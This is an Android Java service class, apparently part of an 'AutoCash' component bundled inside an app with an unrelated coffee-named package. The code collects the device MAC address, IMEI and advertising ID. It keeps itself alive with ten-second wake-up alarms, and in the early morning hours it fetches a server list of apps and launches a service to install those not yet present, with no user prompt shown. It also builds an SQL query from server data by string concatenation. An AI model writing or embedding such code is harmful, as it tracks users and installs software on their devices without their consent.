package kr.co.inno.autocash.service;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.os.Vibrator;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import java.io.IOException;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;
import java.util.List;

import kr.co.inno.autocash.Autoapp_DBopenHelper;
import kr.co.inno.autocash.RestartReceiver;
import kr.co.inno.autocash.cms.AutoInstallList;
import kr.co.inno.autocash.cms.AutoInstallListItem;
import kr.co.inno.autocash.cms.BaseResponse;
import kr.co.inno.autocash.cms.JsonClient;
import kr.co.inno.autocash.cms.PreferencesHelper;
import reina.coffee.ngotronghoangpo.R;

import static android.os.Build.VERSION.SDK_INT;

@SuppressLint({"InflateParams"})
public class AutoServiceActivity extends Service
{
    public static Context context;

    private int callingCount = 0;
    private String loginID = "";
    private String memtype = "";
    private String google_id = "";
    private String trhead_google_id = "";
    private String uid = "";
    private String device = "";
    private String authuser = "";
    private String mb_google_id = "";
    private boolean isLogin = false;
    private String currentHour;

    private Intent intent;
    private AlarmManager am;
    private PendingIntent sender;
    private long interval = 1000 * 10;
    private JsonClient client = null;
    public String app_uid;
    private boolean mLockListView;
    public void onCreate() {
        super.onCreate();
        context = this;
        client = JsonClient.getInstance(context);
        SharedPreferences preferences = PreferencesHelper.getInstance(this).getPreferences();
        if (SDK_INT > Build.VERSION_CODES.LOLLIPOP){
            app_uid = getMacAddress_v6();
        }else{
            app_uid = getMACAddress("wlan0");
        }
        startCall(true);
        Log.d("AutoCash", "AutoServiceActivity : Service is Created");
    }

    private String getMacAddress_v6() {
        try {
            List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface nif : all) {
                if (!nif.getName().equalsIgnoreCase("wlan0")) continue;
                byte[] macBytes = nif.getHardwareAddress();
                if (macBytes == null) {
                    return "";
                }
                StringBuilder res1 = new StringBuilder();
                for (byte b : macBytes) {
                    res1.append(Integer.toHexString(b & 0xFF) + ":");
                }
                if (res1.length() > 0) {
                    res1.deleteCharAt(res1.length() - 1);
                }
                return res1.toString();
            }
        } catch (NullPointerException e) {
        } catch (Exception e) {
        }
        return "02:00:00:00:00:00";
    }

    private String getMACAddress(String interfaceName) {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                if (interfaceName != null) {
                    if (!intf.getName().equalsIgnoreCase(interfaceName)) continue;
                }
                byte[] mac = intf.getHardwareAddress();
                if (mac==null) return "";
                StringBuilder buf = new StringBuilder();
                for (int idx=0; idx<mac.length; idx++)
                    buf.append(String.format("%02X:", mac[idx]));
                if (buf.length()>0) buf.deleteCharAt(buf.length()-1);
                return buf.toString();
            }
        } catch (NullPointerException e) {
        } catch (Exception e) {
        }
        return "";
    }

    // 서비스가 호출될때마다 매번 실행(onResume()과 비슷)
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(0,new Notification());
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Log.d("AutoCash", "AutoServiceActivity Version : " + Build.VERSION.SDK_INT);
            Log.d("AutoCash", "AutoServiceActivity Version M : " + Build.VERSION_CODES.M);
            startCall(true);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            Log.d("AutoCash", "AutoServiceActivity Version : " + Build.VERSION.SDK_INT);
            Log.d("AutoCash", "AutoServiceActivity Version KITKAT : " + Build.VERSION_CODES.KITKAT);
            startCall(true);
        }

        new Thread() {
            public void run() {
                try {
                    getIdThread();
                } catch (GooglePlayServicesRepairableException e) {
                    // TODO Auto-generated catch block
                    Log.d("AutoCash", "AutoServiceActivity GooglePlayServicesRepairableException : " + e.toString());
                }
            }
        }.start();

        Log.d("AutoCash", "AutoServiceActivity Service is onStartCommand : " + callingCount);
        user_info();
        SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
        String loginID = prefs.getString("loginID", "");

        // 현재 시간을 저장 한다.
        long now = System.currentTimeMillis();
        Date date = new Date(now);
        // 시간 포맷으로 만든다.
        SimpleDateFormat sdfNow = new SimpleDateFormat("HH");
        currentHour = sdfNow.format(date);
        Log.i("dsu", "자동설치시간" + currentHour);
        auto_count++;
        Log.i("dsu", "auto_count : " + auto_count);
        if(auto_count == 7){
            auto_count = 1;
//            test_vib();
            if(currentHour.equals("03") || currentHour.equals("04")) {//시간때 재로그인
                if ( authuser.equals("1") ) {//재로그인 요청
                    // 재로그인이 필요한경우 재로그인 처리
                    Log.i("dsu", "재로그인요청======>");
                    intent = new Intent(context, AutoLoginServiceActivity.class);
                    context.startService(intent);
                    event_count--;
                }else{
                    if(!loginID.equals("")) {
                        Log.i("dsu", "자동설치시작======>");
                        getData();
                    }
                }
            }else if(currentHour.equals("05")) {//시간때 재로그인
                if ( authuser.equals("1") ) {//재로그인 요청
                    // 재로그인이 필요한경우 재로그인 처리
                    Log.i("dsu", "재로그인요청======>");
                    intent = new Intent(context, AutoLoginServiceActivity.class);
                    context.startService(intent);
                    event_count--;
                }else{
                    if(!loginID.equals("")) {
                        Log.i("dsu", "자동설치시작======>");
                        getData();
                    }
                }
            }
        }
        callingCount++;
        return START_STICKY;
    }

    private void test_vib(){
        Vibrator vibrator = (Vibrator)context.getSystemService(Context.VIBRATOR_SERVICE);
        long[] pattern = {1000,1000,1000,1000,1000,0};
        vibrator.vibrate(pattern,-1);
    }

    int auto_count = 0;
    public void getIdThread() throws GooglePlayServicesRepairableException {
        AdvertisingIdClient.Info adInfo = null;
        try {
            adInfo = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext());
        } catch (IOException e) {
            Log.d("AutoCash", "AutoServiceActivity IOException : " + e.toString());
        } catch (GooglePlayServicesNotAvailableException e) {
            Log.d("AutoCash", "AutoServiceActivity GooglePlayServicesNotAvailableException : " + e.toString());
        } catch (IllegalStateException e) {
            Log.d("AutoCash", "AutoServiceActivity IllegalStateException : " + e.toString());
        } catch (GooglePlayServicesRepairableException e) {
            Log.d("AutoCash", "AutoServiceActivity GooglePlayServicesRepairableException : " + e.toString());
        }

        try{
            trhead_google_id = adInfo.getId();
            final boolean isLAT = adInfo.isLimitAdTrackingEnabled();

            if ( trhead_google_id == null ) {
            } else if ( !trhead_google_id.equals(google_id) ) {
                SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
                SharedPreferences.Editor editor = prefs.edit();
                editor.putString("google_id", trhead_google_id);
                editor.commit();
            }

            String imei = "";
            try {
                TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                imei = telephonyManager.getDeviceId();
            } catch(SecurityException e) {
                Log.d("AutoCash", "AutoServiceActivity SecurityException : " + e.toString());
            } catch(NullPointerException e) {

            }

            SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
            SharedPreferences.Editor editor = prefs.edit();
            editor.putString("uid", imei);
            editor.commit();
        }catch (NullPointerException n){

        }catch (Exception e){

        }
    }

    // 데이터 가져오기
    public String aai_seq = "empty";
    public static Autoapp_DBopenHelper autoapp_mydb;
    private void getData() {
        mLockListView = true;
        /** 통신처리 */
        client.init(R.string.auto_install_list);
        client.post(new BaseResponse<AutoInstallList>(context) {
            @Override
            public void onResponse(AutoInstallList response) {
                try{
                    if (!response.code.equals("000")) {
//                        Toast.makeText(context, response.msg, Toast.LENGTH_SHORT).show();
                        return;
                    }
                    if ( response.list != null ) {
                        for (int i = 0; i < response.list.size(); i++) {
                            AutoInstallListItem frItem = response.list.get(i);
                        }
                        if (event_count == response.list.size()) {
                            event_count = 0;
                        }
                        autoapp_mydb = new Autoapp_DBopenHelper(context);
                        Cursor cursor = autoapp_mydb.getReadableDatabase().rawQuery(
                                "select * from auto_app_list where aai_seq = '"+response.list.get(event_count).aai_seq+"'", null);
                        if(null != cursor && cursor.moveToFirst()){
                            aai_seq = cursor.getString(cursor.getColumnIndex("aai_seq"));
                        }else{
                            aai_seq = "empty";
                        }
                        Log.i("dsu", "디비체킹 : " + aai_seq);
                        if(aai_seq.equals("empty")){
                            do_autoring_service(response.list.get(event_count).aai_link_url, response.list.get(event_count).aai_fg_package);
                            event_count++;
                            Log.i("dsu", "처음깔린앱! 자동다운로드시작===>");
                        }else{
                            event_count++;
                            Log.i("dsu", "이미한번 삭제된 어플입니다! 안까는것으로");
                        }
                        mLockListView = false;
                    } else {
//                        Toast.makeText(context, "데이터가 없습니다.", Toast.LENGTH_SHORT).show();
                    }
                }catch (Exception e){
                }finally {
                    if(autoapp_mydb != null){
                        autoapp_mydb.close();
                    }
                }
            }
        });
    }

    private int isNetWork(){
        ConnectivityManager manager = (ConnectivityManager) getSystemService (Context.CONNECTIVITY_SERVICE);
//        boolean isMobileAvailable = manager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).isAvailable();
//        boolean isMobileConnect = manager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).isConnectedOrConnecting();
        boolean isWifiAvailable = manager.getNetworkInfo(ConnectivityManager.TYPE_WIFI).isAvailable();
        boolean isWifiConnect = manager.getNetworkInfo(ConnectivityManager.TYPE_WIFI).isConnectedOrConnecting();

        if ((isWifiAvailable && isWifiConnect)) {
            Log.d("AutoCash", "AutoServiceActivity isWifi : true");
            return 1;
        }
        /*else  if ((isMobileAvailable && isMobileConnect)) {
            Log.d("AutoCash", "AutoServiceActivity isMobile : true");
            return 2;
        }*/
        else{
            Log.d("AutoCash", "AutoServiceActivity isWifi : false");
            return 3;
        }
    }

    private void user_info(){
        SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
        loginID = prefs.getString("loginID", "");
        memtype = prefs.getString("memType", "");
        google_id = prefs.getString("google_id", "");
        uid = prefs.getString("uid", "");
        authuser = prefs.getString("authuser", "");
        boolean chkLogin = (loginID.equals("")||memtype.equals("")) ? false:true;

        if ( isLogin != chkLogin ) {
            isLogin = chkLogin;
        }
        Log.i("dsu", "loginID : " + loginID + "\nmemtype : " + memtype + "\ngoogle_id : " + google_id + "\nuid" + uid + "\nauthuser" + authuser);
    }

    int event_count = 0;
    private void do_autoring_service(String ev_app_pkg, String aai_fg_package){
        boolean isInstalled = isAppInstalled(ev_app_pkg);
        Log.i("dsu", "isInstalled 앱깔림 : "  + isInstalled);
        Log.i("dsu", "ev_app_pkg : " + event_count+ "< 앱제목 : " +  ev_app_pkg);
        if ( isInstalled == true ) {
            /*Intent intent = new Intent(context, AutoServiceActivity.class);
            context.stopService(intent);*/
        }else{
            Intent intent = new Intent(context, AutoWebviewServiceActivity.class);
            intent.putExtra("ev_app_pkg", ev_app_pkg);
            intent.putExtra("aai_fg_package", aai_fg_package);
            context.startService(intent);
        }
    }



    protected boolean isAppInstalled(String packageName) {
        Intent mIntent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (mIntent != null) {
            return true;
        }
        else {
            return false;
        }
    }

    public void startCall(Boolean isOn) {
        Log.d("AutoCash", "AutoServiceActivity Service is AutoServiceActivity :  startCall");
        Calendar calendar = Calendar.getInstance();
        intent = new Intent(context, RestartReceiver.class);
        intent.setAction(RestartReceiver.ACTION_RESTART_SERVICE);
        sender = PendingIntent.getBroadcast(context, 0, intent, 0);
        am = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
        //am.setRepeating(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime(), interval, sender);
        if ( isOn ) {
            //am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime(), interval, sender);
            //am.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), interval, sender);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Log.d("AutoCash", "AutoServiceActivity startCall : Version M");
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + interval, sender);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                Log.d("AutoCash", "AutoServiceActivity startCall : Version KITKAT");
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + interval, sender);
            } else {
                Log.d("AutoCash", "AutoServiceActivity startCall : Version ETC");
                am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime(), interval, sender);
            }
        } else {
            Log.d("AutoCash", "AutoServiceActivity startCall : False");
            am.cancel(sender);
        }
    }

    // 서비스가 종료될때 실행
    public void onDestroy() {
        super.onDestroy();
        startCall(false);
        Log.d("AutoCash", "AutoServiceActivity Service is Destroied");
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
